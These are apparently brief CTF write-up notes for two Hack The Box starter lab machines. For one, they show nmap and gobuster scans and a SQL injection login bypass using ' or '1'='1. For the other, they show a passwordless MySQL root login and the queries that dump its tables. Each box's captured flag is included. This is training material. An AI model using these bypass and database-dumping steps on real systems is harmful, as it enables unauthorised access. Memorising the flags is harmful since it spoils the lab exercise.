# TIER 1 STARTING POINT BOXES

--------------------------------------------------------------------

**TOOLS USED**: nmap, gobuster

**nmap**: network exploration tool and security / port scanner<br>

```
nmap [Scan Type...] [Options] {target specification}
```

Scan Types:<br>
-Ss [DEFAULT] TCP SYN Scan (Doesn't open full TCP connection)<br>
-St TCP Scan (Opens full TCP connection)<br>
-Su UDP Scan<br>

**gobuster**: tool to brute force URIs (dirs, files, dns subdomains)

```
gobuster [command]
```

--------------------------------------------------------------------

## APPOINTMENT BOX

**TOOLS USED**: nmap, gobuster

**IP Address**: 10.129.182.2

```
nmap -sC -sV -p- -oN nmap.txt 10.129.182.2
```

**EXPOSED PORT (SERVICE)**: 80 (http)

```
gobuster dir -u 10.129.182.2 -w /usr/share/dirb/wordlists/common.txt
```

10.129.182.2/js has a js file which shows we can do SQL injection

SQL Validation Query: SELECT * FROM users WHERE name=' ' and password=' '

user: ' or '1'='1 <br>
password: ' or '1'='1 <br>

FLAG: e3d0796d002a446c0e622226f42e9672

--------------------------------------------------------------------

## SEQUEL BOX

**TOOLS USED**: nmap

**IP Address**: 10.129.49.167

```
nmap -sV -sC -T2 -oN nmap.txt 10.129.49.167
```

**EXPOSED PORT (SERVICE)**: 3306 (mysql)

```
mysql -h 10.129.49.167 -u root
```

```
show databases;
use htb;
show tables;
select * from config, users;
```

FLAG: 7b4bec00d1a39e3dd4e021ec3d915da8
